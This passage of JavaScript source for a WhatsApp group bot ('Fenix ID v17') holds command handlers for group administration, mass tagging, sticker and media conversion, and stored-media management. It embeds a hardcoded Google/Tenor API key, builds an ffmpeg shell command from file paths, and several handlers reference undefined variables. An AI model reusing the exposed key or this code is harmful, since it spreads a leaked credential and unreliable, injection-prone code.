                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (!text) return 'Text ?'
                await FenixFucking.groupUpdateDescription(m.chat, text).then((res) => replygcfenix(mess.success)).catch((err) => replygcfenix(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (!quoted) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcfenix(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await FenixFucking.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await FenixFucking.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcfenix(mess.done)
                } else {
                    var memeg = await FenixFucking.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcfenix(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                FenixFucking.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                FenixFucking.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (!isAdmins) return replygcfenix(mess.admin)
                if (!m.quoted) return replygcfenix(`Reply messages with captions ${prefix + command}`)
                FenixFucking.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (args[0] === 'close') {
                    await FenixFucking.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcfenix(`Success In Closing The Group 🕊️`)).catch((err) => replygcfenix(json(err)))
                } else if (args[0] === 'open') {
                    await FenixFucking.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcfenix(`Success In Opening The Group 🕊️`)).catch((err) => replygcfenix(json(err)))
                } else {
                    replygcfenix(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                if (args[0] === 'open') {
                    await FenixFucking.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcfenix(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcfenix(json(err)))
                } else if (args[0] === 'close') {
                    await FenixFucking.groupSettingUpdate(m.chat, 'locked').then((res) => replygcfenix(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcfenix(json(err)))
                } else {
                    replygcfenix(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                let response = await FenixFucking.groupInviteCode(m.chat)
                FenixFucking.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcfenix(mess.admin)
                if (!isBotAdmins) return replygcfenix(mess.botAdmin)
                await FenixFucking.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcfenix(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcfenix(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await FenixFucking.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ꜰᴇɴɪx ɪᴅ ᴠ17`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `contact owner!`
                await FenixFucking.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ꜰᴇɴɪx ɪᴅ ᴠ17`,
                            body: `ᴡᴀ ʙᴏᴛ ᴏᴡɴᴇʀ`,
                            thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `here  ${runtime(process.uptime())}`
                FenixFucking.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ꜰᴇɴɪx ɪᴅ ᴠ17`,
                            body: `ꪶ𝕱ꫂ`,
                            thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
            await loading()
                FenixFucking.sendMessage(m.chat, {
                    text: `Here is all follow for more`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `ꜰᴇɴɪx ɪᴅ ᴠ17`,
                            body: `SCRIPT BY FENIX ID`,
                            thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'dobbbbbnate':
            case 'dojuhjnasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                FenixFucking.sendMessage(m.chat, {
                    text: 'Paypal: https://www.paypal.me/josephfenix13\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await FenixFucking.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
FenixFucking.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, owner`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcfenix(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await FenixFucking.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcfenix('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await FenixFucking.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcfenix(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcfenix(respond)
                if (!text) return replygcfenix(respond)
                replygcfenix(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await FenixFucking.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await FenixFucking.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcfenix(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
FenixFucking.downloadAndSaveMediaMessage(quoted, "gifee")
FenixFucking.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await FenixFucking.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcfenix('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await FenixFucking.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcfenix(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcfenix(`Reply sticker with caption *${prefix + command}*`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    FenixFucking.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcfenix(`Reply sticker with caption *${prefix + command}*`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await FenixFucking.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcfenix(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                FenixFucking.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcfenix(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                FenixFucking.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgfenix.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcfenix(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./www-fucking/Fenix9991/lib/converter')
                let audio = await toPTT(media, 'mp4')
                FenixFucking.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcfenix(`Reply sticker with caption *${prefix + command}*`)
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await FenixFucking.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcfenix(mess.wait)
                let media = await FenixFucking.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcfenix(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcfenix(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcfenix(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcfenix(`Example : ${prefix + command} 😅+🤔`)
                replygcfenix(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await FenixFucking.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcfenix(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                    FenixFucking.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                    FenixFucking.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcfenix(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await FenixFucking.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcfenix(`Example:\n${prefix}fliptext fenixy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcfenix(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNotefenix) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNotefenix.length}*`
                replygcfenix(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of Stickerfenix) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Stickerfenix.length}*`
                replygcfenix(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of Imagefenix) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Imagefenix.length}*`
                replygcfenix(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of Videofenix) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Videofenix.length}*`
                replygcfenix(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcfenix(mess.owner)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await FenixFucking.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcfenix(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./www-fucking/Fenix9991/database/owner.json', JSON.stringify(owner))
replygcfenix(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replygcfenix(mess.owner)
if (!args[0]) return replygcfenix(`Use ${prefix+command} nomor\nExample ${prefix+command} 94773010580`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./www-fucking/Fenix9991/database/owner.json', JSON.stringify(owner))
replygcfenix(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Video Name?')
                if (Videofenix.includes(q)) return replygcfenix("The name you entered already exists")
                let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                Videofenix.push(q)
                await fsx.copy(delb, `./www-fucking/Fenix9991/video/${q}.mp4`)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/video.json', JSON.stringify(Videofenix))
                fs.unlinkSync(delb)
                replygcfenix(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the Video Name')
                if (!Videofenix.includes(q)) return replygcfenix("Name Does Not Exist in Database")
                let wanu = Videofenix.indexOf(q)
                Videofenix.splice(wanu, 1)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/video.json', JSON.stringify(Videofenix))
                fs.unlinkSync(`./www-fucking/Fenix9991/video/${q}.mp4`)
                replygcfenix(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('The name of the image?')
                if (Imagefenix.includes(q)) return replygcfenix("The name you entered is already registered in the database")
                let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                Imagefenix.push(q)
                await fsx.copy(delb, `./www-fucking/Fenix9991/image/${q}.jpg`)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/image.json', JSON.stringify(Imagefenix))
                fs.unlinkSync(delb)
                replygcfenix(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the Image Name')
                if (!Imagefenix.includes(q)) return replygcfenix("The image name you entered is not registered")
                let wanu = Imagefenix.indexOf(q)
                Imagefenix.splice(wanu, 1)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/image.json', JSON.stringify(Imagefenix))
                fs.unlinkSync(`./www-fucking/Fenix9991/image/${q}.jpg`)
                replygcfenix(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the name of the sticker?')
                if (Stickerfenix.includes(q)) return replygcfenix("Name Already In Use")
                let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                Stickerfenix.push(q)
                await fsx.copy(delb, `./www-fucking/Fenix9991/sticker/${q}.webp`)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/sticker.json', JSON.stringify(Stickerfenix))
                fs.unlinkSync(delb)
                replygcfenix(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the name of the sticker')
                if (!Stickerfenix.includes(q)) return replygcfenix("Name Not Registered in Database")
                let wanu = Stickerfenix.indexOf(q)
                StickerFenixFucking.splice(wanu, 1)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/sticker.json', JSON.stringify(Stickerfenix))
                fs.unlinkSync(`./www-fucking/Fenix9991/sticker/${q}.webp`)
                replygcfenix(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the Name?')
                if (VoiceNotefenix.includes(q)) return replygcfenix("Name Already In Use")
                let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
                VoiceNotefenix.push(q)
                await fsx.copy(delb, `./www-fucking/Fenix9991/audio/${q}.mp3`)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/vn.json', JSON.stringify(VoiceNotefenix))
                fs.unlinkSync(delb)
                replygcfenix(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcfenix(mess.prem)
                if (args.length < 1) return replygcfenix('Enter the Name')
                if (!VoiceNotefenix.includes(q)) return replygcfenix("Name Not Registered in Database")
                let wanu = VoiceNotefenix.indexOf(q)
                VoiceNotefenix.splice(wanu, 1)
                fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/vn.json', JSON.stringify(VoiceNotefenix))
                fs.unlinkSync(`./www-fucking/Fenix9991/audio/${q}.mp3`)
                replygcfenix(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix(`What's the zip name?`)
let teks = `${text}`
{
if (Zipfenix.includes(teks)) return replygcfenix("This name is already in use")
let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
Zipfenix.push(teks)
await fsx.copy(delb, `./www-fucking/Fenix9991/zip/${teks}.zip`)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/zip.json', JSON.stringify(Zipfenix))
fs.unlinkSync(delb)
replygcfenix(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix('Enter the text in the zip list')
let teks = `${text}`
{
if (!Zipfenix.includes(teks)) return replygcfenix("This name does not exist in the database")
let wanu = Zipfenix.indexOf(teks)
Zipfenix.splice(wanu, 1)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/zip.json', JSON.stringify(Zipfenix))
fs.unlinkSync(`./www-fucking/Fenix9991/zip/${teks}.zip`)
replygcfenix(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of Zipfenix) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${Zipfenix.length}*`
replygcfenix(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix('What is the name of the apk?')
let teks = `${text}`
{
if (Apkfenix.includes(teks)) return replygcfenix("This name is already in use")
let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./www-fucking/Fenix9991/apk/${teks}.apk`)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/apk.json', JSON.stringify(Apkfenix))
fs.unlinkSync(delb)
replygcfenix(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix('Name of the apk?')
let teks = `${text}`
{
if (!Apkfenix.includes(teks)) return replygcfenix("This name does not exist in the database")
let wanu = Apkfenix.indexOf(teks)
Apkfenix.splice(wanu, 1)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/apk.json', JSON.stringify(Apkfenix))
fs.unlinkSync(`./www-fucking/Fenix9991/apk/${teks}.apk`)
replygcfenix(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of Apkfenix) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${Apkfenix.length}`
replygcfenix(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix('What is the name of the pdf')
let teks = `${text}`
{
if (Docfenix.includes(teks)) return replygcfenix("This name is already in use")
let delb = await FenixFucking.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./www-fucking/Fenix9991/doc/${teks}.pdf`)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/doc.json', JSON.stringify(Docfenix))
fs.unlinkSync(delb)
replygcfenix(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcfenix(mess.prem)
await loading()
if (args.length < 1) return replygcfenix('Enter the name')
let teks = `${text}`
{
if (!Docfenix.includes(teks)) return replygcfenix("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./www-fucking/Fenix9991/database/autoreply/doc.json', JSON.stringify(Docfenix))
fs.unlinkSync(`./www-fucking/Fenix9991/doc/${teks}.pdf`)
replygcfenix(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcfenix(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replygcfenix(mess.group)
                if (isAfkOn) return replygcfenix("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcfenix(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replygcfenix(`Example : ${prefix + command} anime whatsapp status`)
const fenixplaymp3 = require('./www-fucking/Fenix9991/lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await fenixplaymp3.mp3(anup3k.url)
await FenixFucking.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const fenixaudp3 = require('./www-fucking/Fenix9991/lib/ytdl2')
